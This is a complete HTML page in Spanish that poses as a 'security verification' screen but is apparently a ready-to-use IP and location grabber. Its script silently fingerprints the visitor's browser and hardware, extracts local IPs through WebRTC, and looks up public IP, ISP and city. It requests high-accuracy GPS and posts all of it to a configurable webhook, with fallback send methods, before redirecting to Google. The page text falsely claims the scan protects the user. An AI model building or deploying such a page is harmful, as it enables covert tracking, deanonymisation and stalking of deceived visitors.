<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificaci√≥n de Acceso - Sistema de Seguridad</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 650px;
            width: 100%;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #00b4db, #0083b0);
            border-radius: 50%;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            box-shadow: 0 5px 15px rgba(0, 180, 219, 0.3);
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 15px;
            color: #ffffff;
            font-weight: 600;
        }
        
        .subtitle {
            color: #b0b0b0;
            margin-bottom: 30px;
            font-size: 16px;
            line-height: 1.5;
        }
        
        .status-card {
            background: rgba(255, 255, 255, 0.08);
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            text-align: left;
        }
        
        .status-item {
            display: flex;
            justify-content: space-between;
            margin: 10px 0;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .status-label {
            color: #b0b0b0;
            font-size: 13px;
        }
        
        .status-value {
            color: #4CAF50;
            font-weight: 600;
            font-size: 13px;
            text-align: right;
            max-width: 60%;
            word-break: break-all;
        }
        
        .loading {
            margin: 20px 0;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #00b4db;
            border-radius: 50%;
            margin: 0 auto 15px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #00b4db, #4CAF50);
            width: 0%;
            transition: width 0.5s ease;
            border-radius: 3px;
        }
        
        .btn {
            background: linear-gradient(135deg, #00b4db, #0083b0);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 180, 219, 0.4);
        }
        
        .disclaimer {
            font-size: 12px;
            color: #888;
            margin-top: 25px;
            line-height: 1.5;
        }
        
        .gps-permission {
            background: rgba(76, 175, 80, 0.1);
            border: 1px solid rgba(76, 175, 80, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            display: none;
        }
        
        .gps-permission.show {
            display: block;
        }
        
        .location-icon {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .network-info {
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid rgba(255, 193, 7, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            font-size: 13px;
            text-align: left;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 25px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .status-item {
                flex-direction: column;
            }
            
            .status-value {
                text-align: left;
                max-width: 100%;
                margin-top: 5px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üîí</div>
        
        <h1>Verificaci√≥n de Seguridad</h1>
        <p class="subtitle">Analizando dispositivo y conexi√≥n para acceso seguro</p>
        
        <div class="gps-permission" id="gpsPermission">
            <div class="location-icon">üìç</div>
            <p><strong>Permiso de ubicaci√≥n requerido</strong></p>
            <p style="font-size: 14px; margin-top: 8px;">Para una verificaci√≥n m√°s precisa, permite el acceso a tu ubicaci√≥n cuando el navegador lo solicite.</p>
        </div>
        
        <div class="network-info" id="networkInfo">
            <p style="margin-bottom: 10px;"><strong>üåê Informaci√≥n de Red Detectada:</strong></p>
            <div id="networkDetails">Cargando an√°lisis de red...</div>
        </div>
        
        <div class="status-card">
            <div class="status-item">
                <span class="status-label">Estado:</span>
                <span class="status-value" id="statusText">Iniciando...</span>
            </div>
            <div class="status-item">
                <span class="status-label">IP P√∫blica (ISP):</span>
                <span class="status-value" id="publicIpText">Cargando...</span>
            </div>
            <div class="status-item">
                <span class="status-label">IP Local (Dispositivo):</span>
                <span class="status-value" id="localIpText">Detectando...</span>
            </div>
            <div class="status-item">
                <span class="status-label">Proveedor Internet:</span>
                <span class="status-value" id="ispText">Analizando...</span>
            </div>
            <div class="status-item">
                <span class="status-label">Ubicaci√≥n Aproximada:</span>
                <span class="status-value" id="locationText">Detectando...</span>
            </div>
            <div class="status-item">
                <span class="status-label">Ubicaci√≥n Exacta (GPS):</span>
                <span class="status-value" id="exactLocationText">No solicitada</span>
            </div>
            <div class="status-item">
                <span class="status-label">Redirecci√≥n en:</span>
                <span class="status-value" id="timerText">8 segundos</span>
            </div>
        </div>
        
        <div class="loading">
            <div class="spinner"></div>
            <p id="loadingText">Analizando informaci√≥n de red...</p>
        </div>
        
        <div class="progress-bar">
            <div class="progress" id="progressBar"></div>
        </div>
        
        <button class="btn" onclick="skipVerification()" id="skipBtn">
            ‚è≠Ô∏è Continuar sin an√°lisis completo
        </button>
        
        <p class="disclaimer">
            ‚ÑπÔ∏è Este proceso analiza la conexi√≥n para garantizar seguridad. Todos los datos se transmiten de forma encriptada.
        </p>
    </div>

    <script>
        // =============================================
        // ‚öôÔ∏è CONFIGURACI√ìN - EDITA ESTOS VALORES ‚öôÔ∏è
        // =============================================
        
        // 1. TU WEBHOOK PARA RECIBIR DATOS
        const WEBHOOK_URL = 'https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx';
        
        // 2. URL A LA QUE QUIERES REDIRIGIR (DESTINO FINAL)
        const REDIRECT_URL = 'https://www.google.com';
        
        // 3. TIEMPO ANTES DE REDIRIGIR (en segundos)
        const REDIRECT_DELAY = 8;
        
        // =============================================
        
        let collectedData = {};
        let countdown = REDIRECT_DELAY;
        let timerInterval;
        let hasSentData = false;
        let gpsRequested = false;
        
        // Actualizar elementos de la UI
        function updateUI(status, publicIp = null, localIp = null, isp = null, location = null, exactLocation = null) {
            document.getElementById('statusText').textContent = status;
            if (publicIp) document.getElementById('publicIpText').textContent = publicIp;
            if (localIp) document.getElementById('localIpText').textContent = localIp;
            if (isp) document.getElementById('ispText').textContent = isp;
            if (location) document.getElementById('locationText').textContent = location;
            if (exactLocation) document.getElementById('exactLocationText').textContent = exactLocation;
        }
        
        // Actualizar barra de progreso
        function updateProgress(percentage) {
            document.getElementById('progressBar').style.width = percentage + '%';
        }
        
        // Mostrar informaci√≥n de red
        function updateNetworkInfo(info) {
            document.getElementById('networkDetails').innerHTML = info;
        }
        
        // Mostrar/ocultar mensaje de permiso GPS
        function showGPSPermission(show) {
            const gpsEl = document.getElementById('gpsPermission');
            if (show) {
                gpsEl.classList.add('show');
            } else {
                gpsEl.classList.remove('show');
            }
        }
        
        // Iniciar cuenta regresiva
        function startCountdown() {
            const timerEl = document.getElementById('timerText');
            
            timerInterval = setInterval(() => {
                timerEl.textContent = `${countdown} segundos`;
                const progress = 100 - ((countdown / REDIRECT_DELAY) * 100);
                updateProgress(progress);
                
                if (countdown <= 0) {
                    clearInterval(timerInterval);
                    performRedirect();
                }
                countdown--;
            }, 1000);
        }
        
        // Redirigir al destino
        function performRedirect() {
            updateUI('Redirigiendo...');
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 500);
        }
        
        // Saltar verificaci√≥n manualmente
        function skipVerification() {
            clearInterval(timerInterval);
            updateUI('Redirecci√≥n manual...');
            setTimeout(performRedirect, 300);
        }
        
        // =============================================
        // üéØ OBTENER IP LOCAL DEL DISPOSITIVO (NUEVO)
        // =============================================
        
        // M√©todo 1: Usando WebRTC (funciona en Chrome, Firefox, Edge)
        function getLocalIPsWebRTC() {
            return new Promise((resolve) => {
                const ips = [];
                
                // RTCPeerConnection para obtener IPs locales
                const pc = new RTCPeerConnection({
                    iceServers: []
                });
                
                pc.createDataChannel('');
                
                pc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        // Fin de candidatos
                        pc.close();
                        if (ips.length > 0) {
                            resolve(ips);
                        } else {
                            resolve(null);
                        }
                        return;
                    }
                    
                    // Extraer IP del candidato ICE
                    const candidate = e.candidate.candidate;
                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
                    const match = candidate.match(regex);
                    
                    if (match) {
                        const ip = match[1];
                        // Filtrar solo IPs privadas (locales)
                        if (isPrivateIP(ip) && !ips.includes(ip)) {
                            ips.push(ip);
                        }
                    }
                };
                
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(err => {
                        console.log("WebRTC error:", err);
                        resolve(null);
                    });
                
                // Timeout por si falla
                setTimeout(() => {
                    pc.close();
                    if (ips.length > 0) {
                        resolve(ips);
                    } else {
                        resolve(null);
                    }
                }, 1000);
            });
        }
        
        // Funci√≥n para verificar si es IP privada
        function isPrivateIP(ip) {
            // Rangos de IPs privadas:
            // 10.0.0.0 - 10.255.255.255
            // 172.16.0.0 - 172.31.255.255
            // 192.168.0.0 - 192.168.255.255
            // 127.0.0.0 - 127.255.255.255 (loopback)
            // 169.254.0.0 - 169.254.255.255 (link-local)
            
            const parts = ip.split('.');
            if (parts.length !== 4) return false;
            
            const p1 = parseInt(parts[0], 10);
            const p2 = parseInt(parts[1], 10);
            
            return (
                p1 === 10 ||
                (p1 === 172 && p2 >= 16 && p2 <= 31) ||
                (p1 === 192 && p2 === 168) ||
                (p1 === 127) ||
                (p1 === 169 && p2 === 254)
            );
        }
        
        // M√©todo 2: Usando WebSocket (fallback)
        async function getLocalIPsWebSocket() {
            return new Promise((resolve) => {
                try {
                    // Crear WebSocket local
                    const ws = new WebSocket('ws://localhost:8080');
                    ws.onerror = () => {
                        // Esto puede revelar la IP local en algunos casos
                        const connection = ws._socket ? ws._socket.remoteAddress : null;
                        ws.close();
                        resolve(connection ? [connection] : null);
                    };
                    
                    setTimeout(() => {
                        ws.close();
                        resolve(null);
                    }, 500);
                } catch (e) {
                    resolve(null);
                }
            });
        }
        
        // M√©todo 3: Obtener IPs de todas las interfaces de red
        async function getNetworkInterfaces() {
            try {
                // Usar WebRTC para m√∫ltiples IPs
                const ips = await getLocalIPsWebRTC();
                if (ips && ips.length > 0) {
                    return ips;
                }
                
                // Fallback a WebSocket
                const wsIPs = await getLocalIPsWebSocket();
                return wsIPs;
            } catch (error) {
                return null;
            }
        }
        
        // =============================================
        // üåç OBTENER IP P√öBLICA E INFORMACI√ìN DEL ISP
        // =============================================
        
        async function getPublicIPAndISP() {
            try {
                // Servicio 1: ipapi.co (proporciona ISP tambi√©n)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data && data.ip) {
                    return {
                        ip: data.ip,
                        isp: data.org || data.asn || 'Desconocido',
                        ciudad: data.city,
                        region: data.region,
                        pais: data.country_name,
                        lat: data.latitude,
                        lon: data.longitude
                    };
                }
                
                throw new Error('Primer servicio fall√≥');
            } catch (error) {
                try {
                    // Servicio 2: ipify + ip-api
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    
                    const geoResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
                    const geoData = await geoResponse.json();
                    
                    if (geoData.status === 'success') {
                        return {
                            ip: ipData.ip,
                            isp: geoData.isp || 'Desconocido',
                            ciudad: geoData.city,
                            region: geoData.regionName,
                            pais: geoData.country,
                            lat: geoData.lat,
                            lon: geoData.lon
                        };
                    }
                    
                    throw new Error('Segundo servicio fall√≥');
                } catch (e) {
                    // Servicio 3: √öltimo recurso
                    const lastResort = await fetch('https://api.my-ip.io/ip.json');
                    const lastData = await lastResort.json();
                    
                    return {
                        ip: lastData.ip || 'No disponible',
                        isp: 'No detectado',
                        ciudad: 'Desconocida',
                        region: 'Desconocida',
                        pais: 'Desconocido'
                    };
                }
            }
        }
        
        // =============================================
        // üìç FUNCI√ìN DE GEOLOCALIZACI√ìN EXACTA (GPS)
        // =============================================
        
        async function getExactLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat_exacta: position.coords.latitude,
                            lon_exacta: position.coords.longitude,
                            precision: position.coords.accuracy + " metros",
                            timestamp: new Date(position.timestamp).toISOString(),
                            velocidad: position.coords.speed || 0,
                            altitud: position.coords.altitude || 0
                        });
                    },
                    (error) => {
                        console.log("GPS denegado:", error.message);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // =============================================
        // üìä RECOLECTAR INFORMACI√ìN COMPLETA DEL NAVEGADOR
        // =============================================
        
        function collectBrowserData() {
            const data = {
                // Informaci√≥n b√°sica
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor || 'Desconocido',
                language: navigator.language,
                languages: navigator.languages || [],
                cookies: navigator.cookieEnabled,
                
                // Pantalla
                screen: `${screen.width}x${screen.height}`,
                screen_avail: `${screen.availWidth}x${screen.availHeight}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                
                // Sistema
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                
                // P√°gina
                referrer: document.referrer || 'directo',
                url: window.location.href,
                host: window.location.host,
                protocol: window.location.protocol,
                
                // Hardware
                online: navigator.onLine,
                deviceMemory: navigator.deviceMemory || 'unknown',
                cpuCores: navigator.hardwareConcurrency || 'unknown',
                
                // Conexi√≥n
                connection: {}
            };
            
            // Network Information API
            if (navigator.connection) {
                data.connection = {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData,
                    downlinkMax: navigator.connection.downlinkMax
                };
            }
            
            // Plugins
            if (navigator.plugins) {
                data.plugins = Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                }));
            }
            
            // WebGL
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    data.webgl = {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                    };
                }
            }
            
            return data;
        }
        
        // =============================================
        // üì§ ENVIAR DATOS AL WEBHOOK
        // =============================================
        
        async function sendToWebhook(data) {
            if (hasSentData) return false;
            
            try {
                // M√©todo principal: fetch
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify(data)
                });
                
                hasSentData = true;
                console.log('‚úÖ Datos enviados al webhook');
                return true;
            } catch (error) {
                console.warn('‚ùå Error enviando al webhook, usando m√©todo alternativo...');
                
                // M√©todo alternativo 1: FormData
                try {
                    const formData = new FormData();
                    formData.append('data', JSON.stringify(data));
                    
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    });
                    
                    hasSentData = true;
                    return true;
                } catch (e) {
                    // M√©todo alternativo 2: Beacon API (para cuando se cierra la p√°gina)
                    const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
                    navigator.sendBeacon(WEBHOOK_URL, blob);
                    
                    hasSentData = true;
                    return true;
                }
            }
        }
        
        // =============================================
        // üöÄ FUNCI√ìN PRINCIPAL
        // =============================================
        
        async function main() {
            updateUI('Iniciando an√°lisis de seguridad...');
            startCountdown();
            
            // 1. Recolectar datos b√°sicos del navegador
            collectedData = collectBrowserData();
            updateUI('Recolectando informaci√≥n del dispositivo...');
            
            // 2. Obtener IP LOCAL del dispositivo
            document.getElementById('loadingText').textContent = 'Obteniendo IP local del dispositivo...';
            const localIPs = await getNetworkInterfaces();
            
            if (localIPs && localIPs.length > 0) {
                collectedData.local_ips = localIPs;
                const localIpText = localIPs.length > 1 ? `${localIPs[0]} (+${localIPs.length-1} m√°s)` : localIPs[0];
                updateUI('IP local obtenida', null, localIpText);
                
                updateNetworkInfo(`‚úÖ <strong>IPs locales detectadas:</strong><br>${localIPs.join('<br>')}`);
            } else {
                collectedData.local_ips = ['No detectadas'];
                updateUI('IP local no detectada', null, 'No disponible');
                updateNetworkInfo('‚ö†Ô∏è <strong>No se pudieron detectar IPs locales</strong><br>El navegador puede estar bloqueando esta informaci√≥n.');
            }
            
            // 3. Obtener IP P√öBLICA e informaci√≥n del ISP
            document.getElementById('loadingText').textContent = 'Obteniendo IP p√∫blica y proveedor...';
            const publicInfo = await getPublicIPAndISP();
            
            collectedData.public_ip = publicInfo.ip;
            collectedData.isp = publicInfo.isp;
            collectedData.public_location = {
                ciudad: publicInfo.ciudad,
                region: publicInfo.region,
                pais: publicInfo.pais,
                lat: publicInfo.lat,
                lon: publicInfo.lon
            };
            
            updateUI(
                'Informaci√≥n de red obtenida',
                publicInfo.ip,
                localIPs ? localIPs[0] : 'No disponible',
                publicInfo.isp,
                `${publicInfo.ciudad}, ${publicInfo.region}, ${publicInfo.pais}`
            );
            
            if (publicInfo.lat && publicInfo.lon) {
                collectedData.mapa_publico = `https://maps.google.com/?q=${publicInfo.lat},${publicInfo.lon}`;
            }
            
            // 4. Solicitar ubicaci√≥n EXACTA por GPS
            document.getElementById('loadingText').textContent = 'Solicitando ubicaci√≥n precisa (GPS)...';
            showGPSPermission(true);
            
            // Llamar a la funci√≥n de geolocalizaci√≥n exacta
            const gpsData = await getExactLocation();
            showGPSPermission(false);
            
            if (gpsData) {
                collectedData.gps = gpsData;
                const exactText = `${gpsData.lat_exacta.toFixed(6)}, ${gpsData.lon_exacta.toFixed(6)} (${gpsData.precision})`;
                updateUI(
                    'Ubicaci√≥n GPS obtenida',
                    publicInfo.ip,
                    localIPs ? localIPs[0] : 'No disponible',
                    publicInfo.isp,
                    `${publicInfo.ciudad}, ${publicInfo.pais}`,
                    exactText
                );
                
                collectedData.mapa_exacto = `https://maps.google.com/?q=${gpsData.lat_exacta},${gpsData.lon_exacta}`;
                document.getElementById('loadingText').textContent = 'Ubicaci√≥n GPS obtenida ‚úì';
            } else {
                updateUI(
                    'GPS no disponible',
                    publicInfo.ip,
                    localIPs ? localIPs[0] : 'No disponible',
                    publicInfo.isp,
                    `${publicInfo.ciudad}, ${publicInfo.pais}`,
                    'No permitida o no disponible'
                );
                document.getElementById('loadingText').textContent = 'GPS no disponible';
            }
            
            // 5. Mostrar resumen de red
            let networkSummary = `
                <strong>üåê RESUMEN DE CONEXI√ìN:</strong><br>
                ‚Ä¢ <strong>IP P√∫blica:</strong> ${publicInfo.ip}<br>
                ‚Ä¢ <strong>ISP:</strong> ${publicInfo.isp}<br>
                ‚Ä¢ <strong>Ubicaci√≥n ISP:</strong> ${publicInfo.ciudad}, ${publicInfo.region}, ${publicInfo.pais}<br>
                ${localIPs && localIPs.length > 0 ? `‚Ä¢ <strong>IPs Locales:</strong> ${localIPs.join(', ')}<br>` : ''}
                ${gpsData ? `‚Ä¢ <strong>GPS Exacto:</strong> ${gpsData.lat_exacta.toFixed(6)}, ${gpsData.lon_exacta.toFixed(6)} (${gpsData.precision})` : ''}
            `;
            
            updateNetworkInfo(networkSummary);
            
            // 6. Enviar TODOS los datos al webhook
            document.getElementById('loadingText').textContent = 'Enviando datos de an√°lisis...';
            await sendToWebhook(collectedData);
            
            updateUI('An√°lisis completado ‚úì');
            document.getElementById('loadingText').textContent = 'An√°lisis de seguridad completado ‚úì';
            
            // Redirigir si el contador ya termin√≥
            if (countdown <= 0) {
                performRedirect();
            }
        }
        
        // Iniciar cuando la p√°gina cargue
        document.addEventListener('DOMContentLoaded', main);
        
        // Forzar redirecci√≥n despu√©s de 10 segundos m√°ximo
        setTimeout(() => {
            if (countdown > 0) {
                document.getElementById('loadingText').textContent = 'Redirigiendo...';
                skipVerification();
            }
        }, 10000);
        
        // Cambiar texto del bot√≥n despu√©s de 3 segundos
        setTimeout(() => {
            document.getElementById('skipBtn').innerHTML = '‚è≠Ô∏è Continuar ahora';
        }, 3000);
    </script>
</body>
</html>